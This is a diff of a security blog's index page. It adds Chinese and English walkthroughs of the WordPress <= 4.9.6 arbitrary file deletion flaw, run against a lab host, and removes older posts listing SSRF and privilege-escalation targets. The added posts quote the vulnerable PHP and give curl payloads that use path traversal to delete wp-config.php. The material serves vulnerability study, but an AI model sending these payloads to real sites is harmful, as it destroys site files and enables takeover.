@@ -76,6 +76,148 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/" class="article-date">
+  <time datetime="2018-06-27T05:01:41.000Z" itemprop="datePublished">2018-06-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/">Wordpress &lt;= 4.9.6 任意文件删除漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="https://twitter.com/ambulong" target="_blank" rel="external">@Ambulong</a></p>
+<p>WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。</p>
+<p>昨日RIPS团队公开了一个Wordpress的<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="external">任意文件删除漏洞</a>（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.</p>
+<p>本文我们将结合 VulnSpy 的<a href="http://www.vulnspy.com/wordpress-4.9/" target="_blank" rel="external">在线 WordPress 环境</a>来演示该漏洞的利用。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol>
+<li>文件wp-includes/post.php中：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_delete_attachment</span><span class="params">( $post_id, $force_delete = false )</span> </span>&#123;</div><div class="line">	...</div><div class="line">	$meta = wp_get_attachment_metadata( $post_id );</div><div class="line">	...</div><div class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>($meta[<span class="string">'thumb'</span>]) ) &#123;</div><div class="line">		<span class="comment">// Don't delete the thumb if another attachment uses it.</span></div><div class="line">		<span class="keyword">if</span> (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( <span class="string">"SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id &lt;&gt; %d"</span>, <span class="string">'%'</span> . $wpdb-&gt;esc_like( $meta[<span class="string">'thumb'</span>] ) . <span class="string">'%'</span>, $post_id)) ) &#123;</div><div class="line">			$thumbfile = str_replace(basename($file), $meta[<span class="string">'thumb'</span>], $file);</div><div class="line">			<span class="comment">/** This filter is documented in wp-includes/functions.php */</span></div><div class="line">			$thumbfile = apply_filters( <span class="string">'wp_delete_file'</span>, $thumbfile );</div><div class="line">			@ unlink( path_join($uploadpath[<span class="string">'basedir'</span>], $thumbfile) );</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>$meta[&#39;thumb&#39;]</code>来自与数据库，是图片的属性之一。代码未检查<code>$meta[&#39;thumb&#39;]</code>的内容，直接带入<code>unlink</code>函数，如果<code>$meta[&#39;thumb&#39;]</code>可控则可导致文件删除。</p>
+<ol>
+<li>文件/wp-admin/post.php中：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">switch</span>($action) &#123;</div><div class="line">...</div><div class="line">	<span class="keyword">case</span> <span class="string">'editattachment'</span>:</div><div class="line">		check_admin_referer(<span class="string">'update-post_'</span> . $post_id);</div><div class="line">		...</div><div class="line">		<span class="comment">// Update the thumbnail filename</span></div><div class="line">		$newmeta = wp_get_attachment_metadata( $post_id, <span class="keyword">true</span> );</div><div class="line">		$newmeta[<span class="string">'thumb'</span>] = $_POST[<span class="string">'thumb'</span>];</div><div class="line"></div><div class="line">		wp_update_attachment_metadata( $post_id, $newmeta );</div><div class="line">...</div></pre></td></tr></table></figure>
+<p><code>$newmeta[&#39;thumb&#39;]</code>来自于$_POST[‘thumb’]，未经过滤直接将其存入数据库，即上一步的<code>$meta[&#39;thumb&#39;]</code>可控。</p>
+<p>详细分析可见：WARNING: WordPress File Delete to Code Execution - <a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="external">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>1. 使用VSPlate安装你的Wordpress 4.9</strong></p>
+<p>Wordpress 4.9 在线环境: <a href="https://www.vsplate.com/?github=vulnspy%2Fwordpress-4.9" target="_blank" rel="external">https://www.vsplate.com/?github=vulnspy/wordpress-4.9</a></p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/1.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>2. 登录后台，添加媒体</strong></p>
+<p>访问 <a href="http://9c9b.vsplate.me/wp-admin/upload.php" target="_blank" rel="external">http://9c9b.vsplate.me/wp-admin/upload.php</a>,  上传任意图片.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/2.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>3. 将 $meta[‘thumb’] 设置为我们要删除的文件</strong></p>
+<p>3.1 点击第二步中我们上传的图片, 并记住图片ID.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p>3.2 访问 <a href="http://9c9b.vsplate.me/wp-admin/post.php?post=4&amp;action=edit" target="_blank" rel="external">http://9c9b.vsplate.me/wp-admin/post.php?post=4&amp;action=edit</a>. 在网页源代码中找到 <code>_wpnonce</code>.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.2.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p>3.3 发送Payload: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'http://9c9b.vsplate.me/wp-admin/post.php?post=4'</span> -H <span class="string">'Cookie: ***'</span> -d <span class="string">'action=editattachment&amp;_wpnonce=***&amp;thumb=../../../../wp-config.php'</span></div></pre></td></tr></table></figure>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.3.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>4. 删除文件</strong></p>
+<p>4.1 在网页源码中找到另外一个 <code>_wpnonce</code>.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/4.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p>4.2 发送Payload: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'http://9c9b.vsplate.me/wp-admin/post.php?post=4'</span> -H <span class="string">'Cookie: ***'</span> -d <span class="string">'action=delete&amp;_wpnonce=***'</span></div></pre></td></tr></table></figure>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/4.2.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>5. 刷新网页</strong></p>
+<p>已经可以重装网站。</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/5.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/" data-id="cjiwnkkir000517pvy44ark0l" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/" class="article-date">
+  <time datetime="2018-06-27T04:40:40.000Z" itemprop="datePublished">2018-06-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/">Wordpress &lt;= 4.9.6 Arbitrary File Delection Vulnerbility Exploit</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: <a href="https://twitter.com/ambulong" target="_blank" rel="external">@Ambulong</a></p>
+<p>WordPress is the most popular CMS on the web. According to w3tech, it is used by approximately 30% of all websites. This wide adoption makes it an interesting target for cyber criminals. </p>
+<p>RIPS Team disclosed an Arbitrary File Delection Vulnerbility at Jun. 26, 2018: <a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="external">WARNING: WordPress File Delete to Code Execution</a></p>
+<p>In this article, we will use VulnSpy’s <a href="http://www.vulnspy.com/wordpress-4.9/" target="_blank" rel="external">online Wordpress environment</a> to demonstrate the exploit of this vulnerability.</p>
+<p>VulnSpy’s online WordPress environment address: <a href="http://www.vulnspy.com/wordpress-4.9/" target="_blank" rel="external">http://www.vulnspy.com/wordpress-4.9/</a></p>
+<h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>REF: WARNING: WordPress File Delete to Code Execution - <a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="external">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><strong>1. Launch/Install Your Wordpress 4.9</strong></p>
+<p>Wordpress 4.9 Online Env: <a href="https://www.vsplate.com/?github=vulnspy%2Fwordpress-4.9" target="_blank" rel="external">https://www.vsplate.com/?github=vulnspy/wordpress-4.9</a></p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/1.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>2. Add a New Media</strong></p>
+<p>Visit <a href="http://9c9b.vsplate.me/wp-admin/upload.php" target="_blank" rel="external">http://9c9b.vsplate.me/wp-admin/upload.php</a>, and upload a image.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/2.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>3. Set $meta[‘thumb’] as the file we wanna to delete</strong></p>
+<p>3.1 Click the image we uploaded in <code>Step 2</code>, and remember the image’s ID.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/3.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p>3.2 Visit <a href="http://9c9b.vsplate.me/wp-admin/post.php?post=4&amp;action=edit" target="_blank" rel="external">http://9c9b.vsplate.me/wp-admin/post.php?post=4&amp;action=edit</a>. Find <code>_wpnonce</code> in page source.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/3.2.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p>3.3 Send Payload: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'http://9c9b.vsplate.me/wp-admin/post.php?post=4'</span> -H <span class="string">'Cookie: ***'</span> -d <span class="string">'action=editattachment&amp;_wpnonce=***&amp;thumb=../../../../wp-config.php'</span></div></pre></td></tr></table></figure>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/3.3.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>4. Launch the attack</strong></p>
+<p>4.1 Find <code>_wpnonce</code> in page source.</p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/4.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p>4.2 Send Payload: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'http://9c9b.vsplate.me/wp-admin/post.php?post=4'</span> -H <span class="string">'Cookie: ***'</span> -d <span class="string">'action=delete&amp;_wpnonce=***'</span></div></pre></td></tr></table></figure>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/4.2.png" alt="Wordpress AFD" title="Wordpress AFD">
+<p><strong>5. Refresh the page</strong></p>
+<img src="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/5.1.png" alt="Wordpress AFD" title="Wordpress AFD">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/" data-id="cjiwnkkik000417pve16cv7u8" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-phpMyAdmin-4-8-x-LFI-Exploit" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" class="article-date">
@@ -129,7 +271,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" data-id="cjinwe48h000093pv0dxtpv1d" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" data-id="cjiwnkkjk000k17pvm4l47luu" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
@@ -197,7 +339,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" data-id="cjintzy6b000inzpvb2tnhgdh" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" data-id="cjiwnkkjg000i17pvj8vyfqsr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
@@ -273,7 +415,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/" data-id="cjintzy65000fnzpvzg7ps7jt" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/" data-id="cjiwnkkjc000d17pvowvcbd3d" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
@@ -372,7 +514,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/" data-id="cjintzy6e000knzpv6iq2mdfg" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/" data-id="cjiwnkkje000g17pvnkcj7pxj" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
@@ -445,7 +587,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" data-id="cjintzy5d0003nzpvoxo3ict3" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" data-id="cjiwnkkib000317pvlu5g3wc0" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -514,7 +656,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cjintzy5g0004nzpv6uztc6z2" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cjiwnkkj0000817pvj9ql3r99" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -613,7 +755,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cjintzy67000gnzpvkqug8trd" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cjiwnkkj9000c17pv1e3fxjks" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -716,7 +858,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/09/02/Wordpress-SQL-Injection-Analysis-1/" data-id="cjintzy5l0005nzpvsuthxnno" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/09/02/Wordpress-SQL-Injection-Analysis-1/" data-id="cjiwnkkj4000917pvnyb8gkq9" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -728,292 +870,11 @@
 
 
   
-    <article id="post-SSRF-And-URL-Related-TIPS" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/08/12/SSRF-And-URL-Related-TIPS/" class="article-date">
-  <time datetime="2017-08-11T16:00:01.000Z" itemprop="datePublished">2017-08-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/12/SSRF-And-URL-Related-TIPS/">SSRF And URL Related TIPS</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Author: Ambulong</p>
-<h1 id="SSRF-Related-Tips"><a href="#SSRF-Related-Tips" class="headerlink" title="SSRF Related Tips"></a>SSRF Related Tips</h1><h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><ul>
-<li>Weblogic SSRF</li>
-<li>DokuWiki<ul>
-<li><a href="http://paper.seebug.org/230/" target="_blank" rel="external">DokuWiki fetch.php SSRF漏洞与tok安全验证绕过分析</a></li>
-</ul>
-</li>
-<li>Atlassian Confluence (CVE-2016-6595)<ul>
-<li><a href="http://xdxd.love/2016/06/03/confluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">Confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析</a></li>
-</ul>
-</li>
-<li>Discuz SSRF<ul>
-<li>Discuz + Memcache</li>
-<li>Discuz + Redis </li>
-</ul>
-</li>
-<li>vBulletin SSRF<ul>
-<li>vBulletin + Memcache</li>
-<li>vBulletin + Redis</li>
-</ul>
-</li>
-<li>Password Crack<ul>
-<li>FTP/FTPS</li>
-<li>IMAP/IMAPS/POP3/SMTP</li>
-<li>TELNET</li>
-<li>SSH</li>
-</ul>
-</li>
-</ul>
-<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><ul>
-<li>Redis</li>
-<li>Memcache</li>
-<li>Mongodb</li>
-<li>PHP-CGI/FastCGI</li>
-<li>Struts 2</li>
-<li>Counchdb WEB API</li>
-<li>Atlassian Confluence<ul>
-<li><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">Atlassian Confluence 5.2/5.8.14/5.8.15 - Multiple Vulnerabilities</a></li>
-<li><a href="http://xdxd.love/2016/06/03/confluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">Confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析</a></li>
-</ul>
-</li>
-<li>Axis2</li>
-<li>Glassfish</li>
-<li>JBOSS</li>
-<li>Docker Remote API</li>
-<li>Java RMI</li>
-<li>Elasticsearch Groovy</li>
-<li>WebDav PUT</li>
-<li>WebSphere</li>
-<li>Apache Hadoop</li>
-<li>HFS</li>
-<li>zentoPMS</li>
-</ul>
-<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
-<li><a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="external">bcoles/ssrf_proxy</a></li>
-</ul>
-<h2 id="Posts-amp-Reference"><a href="#Posts-amp-Reference" class="headerlink" title="Posts &amp; Reference"></a>Posts &amp; Reference</h2><ul>
-<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">利用 Gopher 协议拓展攻击面 - 长亭科技</a></li>
-<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="external">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - Orange</a></li>
-<li><a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html" target="_blank" rel="external">How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange</a></li>
-<li><a href="https://www.acunetix.com/blog/articles/ssrf-vulnerability-used-to-scan-the-web-servers-network/" target="_blank" rel="external">Port scanning with Server Side Request Forgery (SSRF) - IAN MUSCAT</a></li>
-<li><a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="external">Build Your SSRF Exploit Framework - ring04h</a></li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/08/12/SSRF-And-URL-Related-TIPS/" data-id="cjintzy560001nzpvjusze80v" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
 
 
-  
-    <article id="post-Local-Privilege-Escalation-Tips" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/08/02/Local-Privilege-Escalation-Tips/" class="article-date">
-  <time datetime="2017-08-01T16:00:00.000Z" itemprop="datePublished">2017-08-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/02/Local-Privilege-Escalation-Tips/">Local Privilege Escalation Tips</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Author: Ambulong</p>
-<h1 id="PHP-SESSION"><a href="#PHP-SESSION" class="headerlink" title="PHP SESSION"></a>PHP SESSION</h1><ul>
-<li>phpMyAdmin</li>
-<li>ownCloud</li>
-</ul>
-<h1 id="PHP-Disable-Functions-Bypass"><a href="#PHP-Disable-Functions-Bypass" class="headerlink" title="PHP Disable Functions Bypass"></a>PHP Disable Functions Bypass</h1><ul>
-<li>Shellshock(CVE-2014-6271)</li>
-<li>Imagemagick</li>
-<li>Ghostscript</li>
-<li>FFmpeg</li>
-</ul>
-<h1 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h1><ul>
-<li>1099 - Java RMI (Java Deserialization RCE)</li>
-<li>2375 - Docker Remote API</li>
-<li>6379 - Redis</li>
-<li>8161 - ActiveMQ (CVE-2016-3088)</li>
-<li>9000 - PHP-CGI/FastCGI RCE</li>
-<li>9001 - Supervisord (CVE-2017-11610)</li>
-<li>9200 - Elasticsearch</li>
-<li>11211 - Memcached</li>
-<li>27017 - MongoDB</li>
-<li>27018 - MongoDB</li>
-<li>27019 - MongoDB</li>
-</ul>
-<h1 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h1><ul>
-<li><p>Shellshock (CVE-2014-6271)</p>
-<ul>
-<li>CGI-based web server</li>
-<li>DHCP</li>
-<li>Git/Subversion</li>
-<li>Qmail</li>
-<li>OpenSSH</li>
-</ul>
-</li>
-<li><p>Cisco Prime Infrastructure (CVE-2016-1291)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
-</li>
-<li><p>IBM WebSphere (CVE-2015-7450)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
-</li>
-<li><p>OpenNMS Java Object Deserialization RCE<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
-</li>
-<li><p>Jenkins CLI (CVE-2015-8103)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
-</li>
-<li><p>Jenkins Groovy XML RCE (CVE-2016-0792)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
-</li>
-<li><p>Oracle WebLogic Server (CVE-2016-3510)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
-</li>
-<li><p>Jenkins Unauthenticated Code Execution (CVE-2017-1000353)<br><a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="external">SSD Advisory – CloudBees Jenkins Unauthenticated Code Execution</a></p>
-</li>
-<li><p>JBOSS</p>
-</li>
-<li><p>Struts 2 RCE</p>
-<ul>
-<li>S2-001</li>
-<li>S2-003 </li>
-<li>S2-005 (CVE-2010-1870)</li>
-<li>S2-007</li>
-<li>S2-008</li>
-<li>S2-009 (CVE-2011-3923)</li>
-<li>S2-012 (CVE-2013-1965)</li>
-<li>S2-013 (CVE-2013-1966)</li>
-<li>S2-015 (CVE-2013-2135, CVE-2013-2134)</li>
-<li>S2-016 (CVE-2013-2251)</li>
-<li>S2-019 (CVE-2013-4316)</li>
-<li>S2-020 (CVE-2014-0094)</li>
-<li>S2-021 (CVE-2014-0112, CVE-2014-0113)</li>
-<li>S2-022 (CVE-2014-0116)</li>
-<li>S2-029 (CVE-2016-0785)</li>
-<li>S2-032 (CVE-2016-3081)</li>
-<li>S2-033 (CVE-2016-3087)</li>
-<li>S2-036 (CVE-2016-4461)</li>
-<li>S2-037 (CVE-2016-4438)</li>
-<li>S2-045 (CVE-2017-5638)</li>
-<li>S2-046 (CVE-2017-5638)</li>
-<li>S2-048 (CVE-2017-9791)</li>
-<li>S2-devMode</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>Apache Tomcat</li>
-</ul>
-<h1 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h1><ul>
-<li>PHP SESSION SAVE PATH<ul>
-<li>/tmp</li>
-<li>/var/lib/php/</li>
-<li>/var/lib/php5/</li>
-<li>/var/lib/php/sessions/</li>
-<li>/var/lib/php5/sessions/</li>
-</ul>
-</li>
-<li>NGINX CONFIG<ul>
-<li>/usr/local/nginx/conf/nginx.conf </li>
-<li>/usr/local/nginx/nginx.conf</li>
-<li>/etc/nginx/nginx.conf</li>
-</ul>
-</li>
-<li>APACHE CONFIG<ul>
-<li>/etc/httpd/conf/httpd.conf</li>
-<li>/usr/local/apache/conf/httpd.conf</li>
-<li>/usr/local/apache2/conf/httpd.conf</li>
-<li>/etc/httpd/conf.d</li>
-<li>/etc/apache2/conf/httpd.conf</li>
-<li>/etc/apache2/httpd.conf</li>
-<li>/etc/apache2/sites-available/000-default.conf</li>
-<li>/etc/apache2/sites-enabled/000-default.conf</li>
